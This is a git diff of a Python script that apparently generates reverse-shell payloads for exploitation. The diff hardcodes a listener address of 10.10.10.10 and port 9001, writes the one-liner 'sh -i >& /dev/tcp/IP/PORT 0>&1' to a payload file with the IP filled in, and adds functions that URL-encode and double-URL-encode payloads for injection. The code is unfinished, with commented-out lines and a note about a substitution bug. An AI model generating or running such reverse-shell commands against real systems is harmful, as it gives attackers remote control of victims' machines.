@@ -23,8 +23,13 @@ print('''
                                                                                       Twitter: https://twitter.com/VainXploits
                                                                                     
 ''')
+
+IP_var = '10.10.10.10'
+PORT_var = '9001'
+
+
 #######################NOTES-STR#######################
-PAYLOAD = input("What payload do you want to use: ")
+# PAYLOAD = input("What payload do you want to use: ")
 # IP_var = input("Receiving IP: ")
 # PORT_var = input("Receiving PORT: ")
 # IP = print(open('file.txt', 'r').read().replace('IP', IP_var) ) # ----> Really Really important.
@@ -32,17 +37,19 @@ PAYLOAD = input("What payload do you want to use: ")
 #######################NOTES-END#######################
 
 def display_payload_options():
-  f = open('demo.txt', 'r')
+  f = open('assets/payloads.txt', 'r')
   file_contents = f.read()
   print(file_contents)
   f.close()
 
-def main():
-  # open the sample file used
-  file = open('assets/payloads.txt')
-  # read the content of the file opened
-  content = file.readlines()
-  # read nth line from the file
+# display_payload_options()
+
+
+# open the sample file used
+file = open('assets/payloads.txt')
+# read the content of the file opened
+content = file.readlines()
+# print(content[0])
 
 
 def display_actual():
@@ -50,8 +57,9 @@ def display_actual():
   content1 = kilo.readlines()
   f = open("assets/current-payload.txt", "x+")
   f = open('assets/current-payload.txt', 'w')
-  f.write("sh -i >& /dev/tcp/IP/PORT 0>&1")
+  oscar = f.write("sh -i >& /dev/tcp/IP/PORT 0>&1")
   # WORKS UNTIL THE ABOVE LINE ^^
+  print(content[0].replace('IP', IP_var))  # ---> This lie only replaces IP and doesn't replace PORT, some problem with & character.
 display_actual()
 
 # output = io.StringIO()
@@ -59,12 +67,12 @@ display_actual()
 
 # This function is for urlencoding the payloads.
 def url_encode():
-  alpha = urllib.parse.quote(main(), safe='')
+  alpha = urllib.parse.quote('payload', safe='')
   print(alpha)
 
 # This function is for double urlencoding the payloads.
 def double_url_encode():
-  bravo = urllib.parse.quote(main(), safe='')
+  bravo = urllib.parse.quote('payload', safe='')
   charlie = urllib.parse.quote(bravo, safe='')
   print(charlie)
 
